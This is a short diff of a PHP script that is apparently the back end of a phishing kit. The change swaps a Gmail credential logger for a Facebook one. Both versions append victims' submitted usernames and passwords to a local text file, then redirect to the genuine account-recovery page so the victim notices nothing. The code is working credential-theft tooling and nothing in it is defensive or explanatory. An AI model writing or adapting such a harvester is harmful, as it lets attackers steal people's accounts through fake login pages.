@@ -1,6 +1,5 @@
-<?php
-
-file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
+<?php 
+file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
+header('Location: https://facebook.com/recover/initiate/');
 exit();
 ?>
